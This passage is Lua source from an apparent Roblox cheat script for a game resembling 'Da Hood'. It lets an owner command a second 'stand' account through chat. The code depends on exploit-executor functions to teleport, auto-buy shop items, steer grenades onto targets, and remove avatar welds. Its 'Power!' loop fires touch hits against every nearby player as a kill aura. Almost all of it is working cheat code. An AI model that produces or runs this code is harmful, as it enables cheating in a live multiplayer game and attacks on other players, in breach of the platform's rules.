    OWNER.Chatted:Connect(function(msg)
        if msg == ('777777777') then
            SummonPose3()
        end
    end)
    
    Create("Desummon!",function()
        Vanish()
    end)
    
    Create("Killer Queen!",function()
        if SummonMusic == true then
            play(5818138638,true,true)
        end
        Summon()
    end)
    
    Create("Star Platinum: The World",function()
        if SummonMusic == true then
            play(2404992854,true,true)
        end
        Summon()
    end)
    
    Create("Star Platinum : OverHeaven",function()
        if SummonMusic == true then
            play(5684695930,true,true)
        end
        Summon()
    end)
    
    Create("Star Platinum,Za Warudo!",function()
        if SummonMusic == true then
            play(5736107502,true,true)
        end
        Summon()
    end)
    
    Create("Star Platinum!",function()
        Summon()
    end)
    
    Create("ZA WARUDO : OVER HEAVEN",function()
        if SummonMusic == true then
            play(5129686200,true,true)
        end
        Summon()
    end)
    
    Create("C moon!",function()
        if SummonMusic == true then
            play(8258958078,true,true)
        end
        Summon()
    end)
    
    Create("D4C!",function()
        if SummonMusic == true then
            play(8769131644,true,true)
        end
        Summon()
    end)
    
    Create("King Crimson!",function()
        if SummonMusic == true then
            play(3373956700,true,true)
        end
        Summon()
    end)
    
    Create("Made In Heaven!",function()
        if SummonMusic == true then
            play(8713037614,true,true)
        end
        Summon()
    end)
    
    Create('Save!',function()
        SAVEOWNER()
    end)
    
    OWNER.Chatted:Connect(function(msg)
        if msg == ('/e w') then
            Vanish()
        end
    end)
    
    Create('Vanish!',function()
        Vanish()
    end)
    
    Create('Boom!',function()
        Stop()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(108.681839, -26.7500305, -272.597198, -0.981091559, -1.9960247e-8, -0.19354406, -1.5902334e-8, 1, -2.2519941e-8, 0.19354406, -1.9016323e-8, -0.981091559);
        wait(0.5);
        fireclickdetector(game:GetService("Workspace").Ignored.Shop["[Grenade] - $721"].ClickDetector);
        wait(0.2);
        game.Players.LocalPlayer.Backpack["[Grenade]"].Parent = game.Players.LocalPlayer.Character;
        wait(0.6);
        game.Players.LocalPlayer.Character["[Grenade]"]:Activate();
        wait(0.6);
        game.Players.LocalPlayer.Character["[Grenade]"]:Activate();
        c = rs.Heartbeat:Connect(function()
            if game:GetService("Workspace").Ignored:FindFirstChild("Handle") then
                game:GetService("Workspace").Ignored.Handle.Velocity = Vector3.new(0, 27, 0);
                game:GetService("Workspace").Ignored.Handle.CanCollide = false;
                game:GetService("Workspace").Ignored.Handle.Position = OWNER.Character.UpperTorso.Position + (OWNER.Character.Humanoid.MoveDirection * 15);
            end
        end);
        wait(4);
        wait(0.1);
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 2009, 0);
        c:Disconnect();
    end)
    
    Create('Combat!',function()
        OWNER.Character.ChildAdded:Connect(function(a)
            if a.Name == 'Combat' then
                a:Destroy()
                Stop()
                if game.Players.LocalPlayer.Backpack:FindFirstChild("[StopSign]") then else
                    repeat wait()
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-225.856354, 21.740221, -77.2130737, 0.999822319, 1.08228349e-07, 0.0188493319, -1.07573136e-07, 1, -3.57744554e-08, -0.0188493319, 3.37404202e-08, 0.999822319)
                    fireclickdetector(workspace.Ignored.Shop["[StopSign] - $309"].ClickDetector)
                    until game.Players.LocalPlayer.Backpack:FindFirstChild("[StopSign]")
                end
                game.Players.LocalPlayer.Backpack:WaitForChild("[StopSign]")
                game.Players.LocalPlayer.Backpack["[StopSign]"].GripPos = Vector3.new(-15,0,0)
                wait()
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 2000, 0);
                game.Players.LocalPlayer.Backpack["[StopSign]"].Parent = game.Players.LocalPlayer.Character
                wait()
                game.ReplicatedStorage.MainEvent:FireServer("ChargeButton")
                wait(0.6)
                rs:BindToRenderStep("TARGET", -1 , function()
                rs.heartbeat:wait()
                getHumanoid(STAND):ChangeState(11)
                for i,v in pairs(STAND.Character:GetDescendants()) do
                    if v:IsA("BasePart") or v:IsA("MeshPart") or v:IsA("Part") then
                        v.CanCollide = false
                    end
                end
                for _,v in ipairs(STAND.Character:WaitForChild("Humanoid"):GetPlayingAnimationTracks()) do v:Stop() end
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = OWNER.Character.HumanoidRootPart.CFrame * CFrame.new(0, -4, -3) * CFrame.Angles(math.pi*0.5,0,0)
                end)
                wait(1)
                game.Players.LocalPlayer.Character["[StopSign]"].Parent = game.Players.LocalPlayer.Backpack
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, -100, 0);
                rs:UnbindFromRenderStep("TARGET")
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, -100, 0);
                wait(0.2)
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, -100, 0);
                wait(.1)
                getRoot(STAND).CFrame=CFrame.new(-116,-58,146)
                getHumanoid(STAND):ChangeState(8)
            end
        end)
    end)
    
    Create('Glitch!',function()
        game.ReplicatedStorage.MainEvent:FireServer("ResetNew")getHumanoid(STAND):ChangeState'Dead'
        wait(1)
        Knocked = true
    end)
    
    Create('Pre!',function()
        Stop()
        blocking = false
        Bind = false
        noclip = true
        game.ReplicatedStorage.MainEvent:FireServer("LeaveCrew")
        repeat rs.Stepped:Wait()
            getRoot(STAND).CFrame = getRoot(OWNER).CFrame*CFrame.new(0,0,-4.85)
        until KO(STAND).Value == true
        wait(.1)
        game.Players.LocalPlayer.Character.Humanoid:ChangeState(15)
        task.wait()
        game.Players.LocalPlayer.Character.Humanoid:ChangeState(16)
        task.wait()
        game.Players.LocalPlayer.Character.Humanoid:ChangeState(0)
        repeat rs.Stepped:Wait() until KO(STAND).Value == false
        noclip = false
        local Neck = Instance.new("Motor6D");
        Neck.Name = "Neck";
        Neck.Parent = game:GetService("Players").LocalPlayer.Character.Head;
        Neck.C0 = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1);
        Neck.C1 = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1);
        Neck.Part0 = game:GetService("Players").LocalPlayer.Character.UpperTorso;
        Neck.Part1 = game:GetService("Players").LocalPlayer.Character.Head;
        STAND.Character:FindFirstChild('RightHand').CanCollide = true
        STAND.Character:FindFirstChild('RightHand').CFrame = CFrame.new(0,-9999,0)
        STAND.Character:FindFirstChild('LeftHand'):Destroy()
        STAND.Character:FindFirstChild('RightFoot'):Destroy()
        STAND.Character:FindFirstChild('LeftFoot'):Destroy()
        STAND.Character:FindFirstChild('RightHand').CFrame = CFrame.new(0,-9999,0)
    end)
    
    Create('Unblock!',function()
        Stop()
        blocking = false
        Bind = false
        noclip = true
        game.ReplicatedStorage.MainEvent:FireServer("LeaveCrew")
        repeat rs.Stepped:Wait()
            getRoot(STAND).CFrame = getRoot(OWNER).CFrame*CFrame.new(0,0,-4.85)
        until KO(STAND).Value == true
        wait(.1)
        game.Players.LocalPlayer.Character.Humanoid:ChangeState(15)
        task.wait()
        game.Players.LocalPlayer.Character.Humanoid:ChangeState(16)
        task.wait()
        game.Players.LocalPlayer.Character.Humanoid:ChangeState(0)
        follow = true
        repeat rs.Stepped:Wait() until KO(STAND).Value == false
        Chat('Hand weld successfully removed.')
        wait(1)
        game.ReplicatedStorage.MainEvent:FireServer("JoinCrew",CrewID) 
        wait(1)
        game.ReplicatedStorage.MainEvent:FireServer("JoinCrew",CrewID) 
    end)
    
    Create('Unblock1!',function()
        Stop()
        blocking = false
        Bind = false
        noclip = true
        game.ReplicatedStorage.MainEvent:FireServer("LeaveCrew")
        repeat rs.Stepped:Wait()
            getRoot(STAND).CFrame = getRoot(OWNER).CFrame*CFrame.new(0,0,-4.85)
        until KO(STAND).Value == true
        wait(.1)
        game.Players.LocalPlayer.Character.Humanoid:ChangeState(15)
        task.wait()
        game.Players.LocalPlayer.Character.Humanoid:ChangeState(16)
        task.wait()
        game.Players.LocalPlayer.Character.Humanoid:ChangeState(0)
        repeat rs.Stepped:Wait() until KO(STAND).Value == false
        rs.heartbeat:wait(.1)
        STAND.Character:FindFirstChild('LeftHand').CFrame = CFrame.new(0,0,0)
        STAND.Character:FindFirstChild('RightFoot').CFrame = CFrame.new(0,0,0)
        STAND.Character:FindFirstChild('LeftFoot').CFrame = CFrame.new(0,0,0)
        STAND.Character:FindFirstChild('Head').CFrame = CFrame.new(0,0,0)
        rs.heartbeat:wait(.1)
        local Neck = Instance.new("Motor6D");
        Neck.Name = "Neck";
        Neck.Parent = game:GetService("Players").LocalPlayer.Character.Head;
        Neck.C0 = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1);
        Neck.C1 = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1);
        Neck.Part0 = game:GetService("Players").LocalPlayer.Character.UpperTorso;
        Neck.Part1 = game:GetService("Players").LocalPlayer.Character.Head;
    
        local rightwrist = Instance.new("Motor6D");
        rightwrist.Name = "RightWrist";
        rightwrist.Parent = game:GetService("Players").LocalPlayer.Character.RightHand;
        rightwrist.C0 = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1);
        rightwrist.C1 = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1);
        rightwrist.Part0 = game:GetService("Players").LocalPlayer.Character.RightLowerArm;
        rightwrist.Part1 = game:GetService("Players").LocalPlayer.Character.RightHand;
    
        local leftwrist = Instance.new("Motor6D");
        leftwrist.Name = "LeftWrist";
        leftwrist.Parent = game:GetService("Players").LocalPlayer.Character.LeftHand;
        leftwrist.C0 = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1);
        leftwrist.C1 = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1);
        leftwrist.Part0 = game:GetService("Players").LocalPlayer.Character.LeftLowerArm;
        leftwrist.Part1 = game:GetService("Players").LocalPlayer.Character.LeftHand;
    
        local RightAnkle = Instance.new("Motor6D");
        RightAnkle.Name = "RightAnkle";
        RightAnkle.Parent = game:GetService("Players").LocalPlayer.Character.RightFoot;
        RightAnkle.C0 = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1);
        RightAnkle.C1 = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1);
        RightAnkle.Part0 = game:GetService("Players").LocalPlayer.Character.RightLowerLeg;
        RightAnkle.Part1 = game:GetService("Players").LocalPlayer.Character.RightFoot;
    
        local LeftAnkle = Instance.new("Motor6D");
        LeftAnkle.Name = "LeftAnkle";
        LeftAnkle.Parent = game:GetService("Players").LocalPlayer.Character.LeftFoot;
        LeftAnkle.C0 = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1);
        LeftAnkle.C1 = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1);
        LeftAnkle.Part0 = game:GetService("Players").LocalPlayer.Character.LeftLowerLeg;
        LeftAnkle.Part1 = game:GetService("Players").LocalPlayer.Character.LeftFoot;
    end)
    
    
    Create('Weld!',function()
        Stop()
        game.Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart').CFrame = CFrame.new(-547.482239, 173.374954, -0.0784880966)
        blocking = false
        Bind = false
        wait(.4)
        game.Players.LocalPlayer.Character.Humanoid:ChangeState(15)
        task.wait()
        game.Players.LocalPlayer.Character.Humanoid:ChangeState(16)
        task.wait()
        game.Players.LocalPlayer.Character.Humanoid:ChangeState(0)
    end)
    
    
    Create('Rweld!',function()
        local Neck = Instance.new("Motor6D");
        Neck.Name = "Neck";
        Neck.Parent = game:GetService("Players").LocalPlayer.Character.Head;
        Neck.C0 = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1);
        Neck.C1 = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1);
        Neck.Part0 = game:GetService("Players").LocalPlayer.Character.UpperTorso;
        Neck.Part1 = game:GetService("Players").LocalPlayer.Character.Head;
    
        local rightwrist = Instance.new("Motor6D");
        rightwrist.Name = "RightWrist";
        rightwrist.Parent = game:GetService("Players").LocalPlayer.Character.RightHand;
        rightwrist.C0 = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1);
        rightwrist.C1 = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1);
        rightwrist.Part0 = game:GetService("Players").LocalPlayer.Character.RightLowerArm;
        rightwrist.Part1 = game:GetService("Players").LocalPlayer.Character.RightHand;
    
        local leftwrist = Instance.new("Motor6D");
        leftwrist.Name = "LeftWrist";
        leftwrist.Parent = game:GetService("Players").LocalPlayer.Character.LeftHand;
        leftwrist.C0 = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1);
        leftwrist.C1 = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1);
        leftwrist.Part0 = game:GetService("Players").LocalPlayer.Character.LeftLowerArm;
        leftwrist.Part1 = game:GetService("Players").LocalPlayer.Character.LeftHand;
    
        local RightAnkle = Instance.new("Motor6D");
        RightAnkle.Name = "RightAnkle";
        RightAnkle.Parent = game:GetService("Players").LocalPlayer.Character.RightFoot;
        RightAnkle.C0 = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1);
        RightAnkle.C1 = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1);
        RightAnkle.Part0 = game:GetService("Players").LocalPlayer.Character.RightLowerLeg;
        RightAnkle.Part1 = game:GetService("Players").LocalPlayer.Character.RightFoot;
    
        local LeftAnkle = Instance.new("Motor6D");
        LeftAnkle.Name = "LeftAnkle";
        LeftAnkle.Parent = game:GetService("Players").LocalPlayer.Character.LeftFoot;
        LeftAnkle.C0 = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1);
        LeftAnkle.C1 = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1);
        LeftAnkle.Part0 = game:GetService("Players").LocalPlayer.Character.LeftLowerLeg;
        LeftAnkle.Part1 = game:GetService("Players").LocalPlayer.Character.LeftFoot;
    end)
    
    
    Create('Dweld!',function()
        game.Players.localPlayer.Character.Head:FindFirstChildOfClass("Motor6D"):Destroy()
        game.Players.localPlayer.Character.RightUpperArm:FindFirstChildOfClass("Motor6D"):Destroy()
        game.Players.localPlayer.Character.RightHand:FindFirstChildOfClass("Motor6D"):Destroy()
        game.Players.localPlayer.Character.LeftHand:FindFirstChildOfClass("Motor6D"):Destroy()
        game.Players.localPlayer.Character.RightFoot:FindFirstChildOfClass("Motor6D"):Destroy()
        game.Players.localPlayer.Character.LeftFoot:FindFirstChildOfClass("Motor6D"):Destroy()
    end)
    
    Create('Wrist!',function()
        game.Players.localPlayer.Character.RightHand:FindFirstChildOfClass("Motor6D"):Destroy()
    end)
    Create('Boxing!',function()
        Stop()
        noclip = true
        boxing = true
    end)
    
    Create('Power!',function()
        if STAND.DataFolder.Information.FightingStyle.Value == 'Boxing' then
            Stop()
            noclip = true
            Chat('FightingStyle :'..STAND.DataFolder.Information.FightingStyle.Value..' detected.') wait(.1)
            Chat('Switching FightingStyle to Default')
            repeat rs.Stepped:Wait()
                getRoot(STAND).CFrame = game.Workspace.Ignored.Shop["[Default Moveset] - $0"].Head.CFrame
                fireclickdetector(game.Workspace.Ignored.Shop["[Default Moveset] - $0"].ClickDetector)
            until STAND.DataFolder.Information.FightingStyle.Value == 'Default'
            follow = true
        end
        while wait() do
            pcall(function()
                for i,v in pairs(game:GetService('Players'):GetChildren()) do
                    if (v.Character.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.LeftHand.Position).Magnitude <= 50 then
                        firetouchinterest(game.Players.LocalPlayer.Character['RightHand'], v.Character.UpperTorso, 0)
                        firetouchinterest(game.Players.LocalPlayer.Character['LeftHand'], v.Character.UpperTorso, 0)
                        firetouchinterest(game.Players.LocalPlayer.Character['RightFoot'], v.Character.UpperTorso, 0)
                        firetouchinterest(game.Players.LocalPlayer.Character['LeftFoot'], v.Character.UpperTorso, 0)
                        firetouchinterest(game.Players.LocalPlayer.Character['RightLowerLeg'], v.Character.UpperTorso, 0)
                        firetouchinterest(game.Players.LocalPlayer.Character['LeftLowerLeg'], v.Character.UpperTorso, 0)
                    end
                end
            end)
        end
    end)
    
    Create("Wallet!",function()
        if STAND.Backpack:FindFirstChild("Wallet") then
            if Sounds == true then
                play(134732869,true,true)
            end
            STAND.Backpack:FindFirstChild("Wallet").Parent = STAND.Character
        end
    end)
    
    Create("Unwallet!",function()
        if Sounds == true then
            play(8655611378,true,true) 
        end
        getHumanoid(STAND):UnequipTools()
    end)
    
    Create("Autodrop!",function()
        Chat("AutoDrop Enabled!")
        autodrop = true
    end)
    
    Create("Unautodrop!",function()
        Chat("AutoDrop Disabled!")
        autodrop = false
    end)
    
    Create("Moveset1!",function()
        Stop()
        noclip = true
        repeat rs.Stepped:Wait()
            getRoot(STAND).CFrame = game.Workspace.Ignored.Shop["[Default Moveset] - $0"].Head.CFrame
            fireclickdetector(game.Workspace.Ignored.Shop["[Default Moveset] - $0"].ClickDetector)
        until STAND.DataFolder.Information.FightingStyle.Value == 'Default'
        Chat('FightingStyle : '..STAND.DataFolder.Information.FightingStyle.Value)
        follow = true
    end)
    
    Create("Moveset2!",function()
        Stop()
        noclip = true
        repeat rs.Stepped:Wait()
            getRoot(STAND).CFrame = game.Workspace.Ignored.Shop["Boxing Moveset (Require: Max Box Stat) - $0"].Head.CFrame
            fireclickdetector(game.Workspace.Ignored.Shop["Boxing Moveset (Require: Max Box Stat) - $0"].ClickDetector)
        until STAND.DataFolder.Information.FightingStyle.Value == 'Boxing'
        Chat('FightingStyle : '..STAND.DataFolder.Information.FightingStyle.Value)
        follow = true
    end)
    
    
    Create("g!",function()
        for i,v in pairs(game:GetService("Workspace").Ignored:GetChildren()) do
            if v.Name == "Handle" then
                v:Destroy()
            end
        end
    Stop()
        repeat rs.Stepped:Wait()
            getRoot(STAND).CFrame = game.Workspace.Ignored.Shop["[Grenade] - $721"].Head.CFrame
            fireclickdetector(game.Workspace.Ignored.Shop["[Grenade] - $721"].ClickDetector)
        until STAND.Backpack:FindFirstChild("[Grenade]")
        game.Players.LocalPlayer.Backpack["[Grenade]"].Parent = game.Players.LocalPlayer.Character;
        wait(0.6);
        game.Players.LocalPlayer.Character["[Grenade]"]:Activate();
        wait(0.6);
        game.Players.LocalPlayer.Character["[Grenade]"]:Activate();
        c = rs.Heartbeat:Connect(function()
            for i,v in pairs(game:GetService("Workspace").Ignored:GetChildren()) do
                if v.Name == "Handle" then
                    v.CanCollide = false
                    v.Velocity = Vector3.new(0, 27, 0)
                    v.Position = OWNER.Character.UpperTorso.Position + (OWNER.Character.Humanoid.MoveDirection * 15);
                end
            end
        end)
        wait(8);
        c:Disconnect();
    end)
    Create("Nuke!",function()
        for i,v in pairs(game:GetService("Workspace").Ignored:GetChildren()) do
            if v.Name == "Handle" then
                v:Destroy()
            end
        end
        Stop()
        noclip = true
        t = 0
        repeat rs.Stepped:Wait()
            getRoot(STAND).CFrame = game.Workspace.Ignored.Shop["[Grenade] - $721"].Head.CFrame
            fireclickdetector(game.Workspace.Ignored.Shop["[Grenade] - $721"].ClickDetector)
            for i,v in pairs(STAND.Backpack:GetChildren()) do
                if v.Name == "[Grenade]" then
                    t = t + 1 
                    v.Parent = STAND.Character
                end
            end
        until t >= 10
        getHumanoid(STAND):UnequipTools()
    
        wait(.1)
        for i,v in pairs(STAND.Backpack:GetChildren()) do
            wait(0.05)
            spawn(function()
                if v.Name == "[Grenade]" then
                    v.Parent = STAND.Character; v:Activate(); wait(0.1); v:Deactivate(); wait(0.1); v:Activate()
                end
            end)
        end
        c = rs.Heartbeat:Connect(function()
            for i,v in pairs(game:GetService("Workspace").Ignored:GetChildren()) do
                if v.Name == "Handle" then
                    v.CanCollide = false
                    v.Velocity = Vector3.new(0, 27, 0)
                    v.Position = OWNER.Character.UpperTorso.Position + (OWNER.Character.Humanoid.MoveDirection * 15);
                end
            end
        end)
        wait(10);
        c:Disconnect();
    end)
    
    
    Create("Handle!",function()
        local Plr = game.Players.LocalPlayer
        local i = 1
        game.Workspace.Ignored.ChildAdded:connect(function(child)
            if child.Name == "Handle" then
                child.CanCollide = false
                local move = Instance.new("BodyPosition", child)
                move.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                move.P = 1e5
                i = i + 1
                if i>=10 then
                    i=1
                end
                local b = i 
                local c = true
                while c do
                    game.RunService.Stepped:wait()
                    move.Position = (Plr.Character.UpperTorso.CFrame*CFrame.new(-0.6+(0.3*math.floor((b%10)/3)), -0.75+(0.5*(b%3)), -0.8+(1.6*math.floor(b/10)))).p + (Plr.Character.UpperTorso.Velocity*0.04)
                    setsimulationradius(math.huge^math.huge, math.huge)
                end
                move.P = 1e4
                move.Position = Plr.Character.UpperTorso.CFrame.p+(((Plr.Character.UpperTorso.CFrame*CFrame.new(-0.6+(0.3*math.floor((b%10)/3)), -0.75+(0.5*(b%3)), -0.8+(1.6*math.floor(b/10)))).p - Plr.Character.UpperTorso.CFrame.p)*20)
                child.CanCollide = true
            end
        end)
    end)
    Create("Pitch!",function()
        BuyPitch()
    end)
    Create("Hidden!",function()
        if Sounds == true then
            play(8655611378,true,true) 
        end
        AttackMode = "Under"
    end)
    
    Create("Default!",function()
        if Sounds == true then
            play(8655611378,true,true) 
        end
        AttackMode = "Sky"
    end)
    
    Create("ghidden!",function()
        if Sounds == true then
            play(8655611378,true,true) 
        end
        GunMode = "Under"
    end)
    
    Create("gdefault!",function()
        if Sounds == true then
            play(8655611378,true,true) 
        end
        GunMode = "Sky"
    end)
    
    
    Create("Hide!",function()
        Stop()
        noclip = true
        MaskHide()
        follow = true
        if Sounds == true then
            play(8655611378,true,true) 
        end
    end)
    
    function BuyWeight()
        HeavyWeights = 0
        Weights = 0
        repeat rs.Heartbeat:wait()
            STAND.Character.HumanoidRootPart.CFrame = game.Workspace.Ignored.Shop["[HeavyWeights] - $265"].Head.CFrame
            fireclickdetector(game.Workspace.Ignored.Shop["[HeavyWeights] - $265"].ClickDetector)
            for i, v in pairs(STAND.Backpack:GetChildren()) do
                if v.Name == "[HeavyWeights]" then
                    HeavyWeights = HeavyWeights + 1 
                    v.Parent = STAND.Character
                end
            end
        until HeavyWeights >= 2
    
        repeat rs.Heartbeat:wait()
            STAND.Character.HumanoidRootPart.CFrame = game.Workspace.Ignored.Shop["[Weights] - $127"].Head.CFrame
            fireclickdetector(game.Workspace.Ignored.Shop["[Weights] - $127"].ClickDetector)
            for i, v in pairs(STAND.Backpack:GetChildren()) do
                if v.Name == "[Weights]" then
                    Weights = Weights + 1 
                    v.Parent = STAND.Character
                end
            end
        until Weights >= 2
    
        for i, v in pairs(STAND.Backpack:GetChildren()) do
            if v.Name == "[Weights]" and v.Name == "[HeavyWeights]" then
                v.Parent = STAND.Character
            end
        end
    
        AutoWeight = true
    end
    
    Create('Weight!', function()
        Stop()
        BuyWeight()
    end)
    
    Create('lettuce!', function()
        Stop()
        lettucefarm = true
    end)
    
    Create('unlettuce!', function()
        Summon()
    end)
    
    Create('Automask!', function()
        Chat('Automask activated '..CustomName..'!')
        AutoMask = true
    end)
    
    Create('Unautomask!', function()
        Chat('Automask deactivated '..CustomName..'!')
        AutoMask = false
    end)
    
    --[[Create("Morph!",function()
        Stop()
        noclip = true
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Workspace.Ignored.Morphs['[Elf]'].Head.CFrame wait(1)
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Workspace.Ignored.Morphs['[Elf]'].Head.CFrame = TARGET.Character.HumanoidRootPart.CFrame wait(1)
        follow = true
    end)]]
    
    Create('Dcash!',function()
        if Sounds == true then
            play(8655611378,true,true) 
        end	
        game.ReplicatedStorage.MainEvent:FireServer("DropMoney","10000")
    end)
    
    Create('Resolver!',function()
        resolve = true
    end)
    
    Create('Noresolver!',function()
        resolve = false
    end)
    
    Create('Bind!',function()
        Bind = true
    end)
    
    Create('Unbind!',function()
        Bind = false
    end)
    
    Create("pose1",function()
        pose1()
        if Sounds == true then
            play(8655611378,true,true) 
        end
    end)
    
    Create("pose2",function()
        pose2()
        if Sounds == true then
            play(8655611378,true,true) 
        end
    end)
    
    Create("pose3",function()
        pose3()
        if Sounds == true then
            play(8655611378,true,true) 
        end
    end)
    
    Create("leave!",function()
        game:Shutdown()
    end)
    
    Create("StopAudio!",function()
        StopAudio()
    end)
    
    Create("Song!",function()
        play(CustomSong,false,true)
    end)
    
    Create('Heal!',function()
        Heal()
    end)
    
    Create('Stop!',function()
        Stop()
    end)
    
    Create('Uncrew!',function()
        game.ReplicatedStorage.MainEvent:FireServer("LeaveCrew")
    end)
    
    Create('Crew!',function()
        game.ReplicatedStorage.MainEvent:FireServer("JoinCrew",CrewID) 
        wait(1)
        game.ReplicatedStorage.MainEvent:FireServer("JoinCrew",CrewID) 
    end)
    
    Create('Sneak!',function()
        Stop()
        Sneak = true
    end)
    
    Create('Barrage!',function()
        Barrage()
    end)
    
    Create('Nobarrage!',function()
        Nobarrage()
    end)
    local FogDistance = 1500
    local FogSpeed = 900
    local FogOffsets = 20
    Arg('Fdis!',function()
        FogDistance = Arg
    end)
    
    Arg('Fspeed!',function()
        FogSpeed = Arg
    end)
    
    Arg('Offset!',function()
        FogOffsets = Arg
    end)
    
    function FOG()
    rs:BindToRenderStep("FOG", -1 , function()
    rs.Heartbeat:Wait()
    getHumanoid(STAND):ChangeState(16)
    for _,v in ipairs(STAND.Character:WaitForChild("Humanoid"):GetPlayingAnimationTracks()) do v:Stop() end
    if STAND.Character:FindFirstChild('Combat') then STAND.Character:FindFirstChild('Combat'):Activate() else STAND.Backpack:FindFirstChild('Combat').Parent = STAND.Character end
    local Rany = math.random(17,FogOffsets)
    getRoot(STAND).CFrame = CFrame.Angles(0,FogSpeed*math.pi*delta,0)* CFrame.new(0,Rany,FogDistance)
    LowerArm(CFrame.Angles(0,FogSpeed*math.pi*delta,0)* CFrame.new(0,Rany,-FogDistance))
    end)
    end
    function WideFOG()
        rs:BindToRenderStep("FOG", -1 , function()
    rs.Heartbeat:Wait()
    getHumanoid(STAND):ChangeState(16)
    for _,v in ipairs(STAND.Character:WaitForChild("Humanoid"):GetPlayingAnimationTracks()) do v:Stop() end
    if STAND.Character:FindFirstChild('Combat') then STAND.Character:FindFirstChild('Combat'):Activate() else STAND.Backpack:FindFirstChild('Combat').Parent = STAND.Character end
    local Rany = math.random(18,70)
    getRoot(STAND).CFrame = CFrame.Angles(0,FogSpeed*math.pi*delta,0)* CFrame.new(0,Rany,FogDistance)
    LowerArm(CFrame.Angles(0,FogSpeed*math.pi*delta,0)* CFrame.new(0,Rany,-FogDistance))
    end)
    end
    function UpFOG()
        rs:BindToRenderStep("FOG", -1 , function()
    rs.Heartbeat:Wait()
    getHumanoid(STAND):ChangeState(16)
    for _,v in ipairs(STAND.Character:WaitForChild("Humanoid"):GetPlayingAnimationTracks()) do v:Stop() end
    if STAND.Character:FindFirstChild('Combat') then STAND.Character:FindFirstChild('Combat'):Activate() else STAND.Backpack:FindFirstChild('Combat').Parent = STAND.Character end
    local Rany = math.random(45,58)
    getRoot(STAND).CFrame = CFrame.Angles(0,FogSpeed*math.pi*delta,0)* CFrame.new(0,Rany,FogDistance)
    LowerArm(CFrame.Angles(0,FogSpeed*math.pi*delta,0)* CFrame.new(0,Rany,-FogDistance))
    end)
    end
    
    function FlatFOG()
        rs:BindToRenderStep("FOG", -1 , function()
        rs.Heartbeat:Wait()
        getHumanoid(STAND):ChangeState(16)
        for _,v in ipairs(STAND.Character:WaitForChild("Humanoid"):GetPlayingAnimationTracks()) do v:Stop() end
        if STAND.Character:FindFirstChild('Combat') then STAND.Character:FindFirstChild('Combat'):Activate() else STAND.Backpack:FindFirstChild('Combat').Parent = STAND.Character end
        getRoot(STAND).CFrame = CFrame.Angles(0,FogSpeed*math.pi*delta,0)* CFrame.new(0,FogOffsets,FogDistance)
        LowerArm(CFrame.Angles(0,FogSpeed*math.pi*delta,0)* CFrame.new(0,FogOffsets,-FogDistance))
        end)
    end
    
    
    function Circle()
        rs:BindToRenderStep("FOG", -1 , function()
            Dweld()
            rs.Heartbeat:Wait()
            getHumanoid(STAND):ChangeState(16)
            for _,v in ipairs(STAND.Character:WaitForChild("Humanoid"):GetPlayingAnimationTracks()) do v:Stop() end
            if STAND.Character:FindFirstChild('Combat') then STAND.Character:FindFirstChild('Combat'):Activate() else STAND.Backpack:FindFirstChild('Combat').Parent = STAND.Character end
            getRoot(STAND).CFrame = CFrame.Angles(0,2*math.pi*delta,0)* CFrame.new(0,-10,0)+ getRoot(OWNER).Position 
            LowerArm(CFrame.Angles(0,2*math.pi*delta,0)* CFrame.new(0,500,300)+ getRoot(OWNER).Position )
        end)
    end
    
    function defense()
        rs:BindToRenderStep("FOG", -1 , function()
            Dweld()
            rs.Heartbeat:Wait()
            if reversing == true then
                Move = Move - 50
            else
                Move = Move + 50
            end
            if Move >= 100 then
                reversing = true
            elseif Move < -100 then
                reversing = false
            end
            getHumanoid(STAND):ChangeState(16)
            for _,v in ipairs(STAND.Character:WaitForChild("Humanoid"):GetPlayingAnimationTracks()) do v:Stop() end
            if STAND.Character:FindFirstChild('Combat') then STAND.Character:FindFirstChild('Combat'):Activate() else STAND.Backpack:FindFirstChild('Combat').Parent = STAND.Character end
            getRoot(STAND).CFrame = CFrame.Angles(0,2*math.pi*delta,0)* CFrame.new(0,-10,-Move)+ getRoot(OWNER).Position 
